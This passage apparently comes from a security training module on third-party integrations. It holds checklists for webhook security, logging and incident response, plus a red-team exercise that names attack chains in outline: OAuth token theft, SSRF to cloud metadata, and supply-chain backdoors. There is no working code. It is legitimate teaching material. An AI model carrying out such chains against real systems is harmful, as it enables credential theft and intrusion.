- [ ] Data deletion procedures are implemented

### Webhook Security
- [ ] Webhook signatures are validated
- [ ] Timestamp validation prevents replay attacks
- [ ] Rate limiting is implemented
- [ ] SSRF protections are in place
- [ ] Error messages don't leak sensitive information

### Monitoring & Logging
- [ ] All API calls are logged
- [ ] Failed authentication attempts are tracked
- [ ] Anomaly detection is implemented
- [ ] Alert thresholds are configured
- [ ] Audit trail is maintained

### Incident Response
- [ ] Key revocation procedure is documented
- [ ] Emergency contacts are defined
- [ ] Escalation path is clear
- [ ] Communication plan is ready
- [ ] Post-incident review process is established
```

---

## FINAL EXERCISES

### Comprehensive Integration Security Audit

**Objective:** Perform a complete security assessment of a third-party integration.

**Scope:**
1. OAuth implementation
2. API key management
3. Webhook security
4. Third-party script analysis
5. Supply chain assessment

**Deliverables:**
1. Vulnerability report with CVSS scores
2. Proof of concept for each finding
3. Remediation recommendations
4. Risk assessment matrix

### Red Team Integration Challenge

**Objective:** Chain multiple integration vulnerabilities to achieve maximum impact.

**Scenarios:**
1. OAuth token theft → API key extraction → Data exfiltration
2. Webhook SSRF → Cloud metadata access → Credential theft
3. Supply chain compromise → Backdoor installation → Persistent access

---

*This module provides the foundation for advanced third-party integration security assessment. Practice these concepts in controlled environments before testing in bug bounty programs.*